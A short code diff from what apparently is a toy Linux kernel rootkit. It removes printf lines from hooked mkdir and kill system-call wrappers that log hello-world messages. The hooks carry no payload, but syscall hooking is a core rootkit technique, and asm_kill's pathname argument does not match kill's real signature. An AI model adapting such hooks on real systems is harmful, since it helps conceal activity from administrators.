@@ -484,7 +484,6 @@ asmlinkage long asm_mkdir(const char __user *pathname)
     long ret = original_mkdir(pathname);
     asm_hook_patch(asm_mkdir);
     pr_info("Hello world from rootkit mkdir!\n");
-    printf("Hello world from rootkit mkdir!\n");
     return ret;
 }
 
@@ -495,7 +494,6 @@ asmlinkage long asm_kill(const char __user *pathname)
     long ret = original_kill(pathname);
     asm_hook_patch(asm_kill);
     pr_info("Hello world from rootkit kill!\n");
-    printf("Hello world from rootkit kill!\n");
     return ret;
 }
 
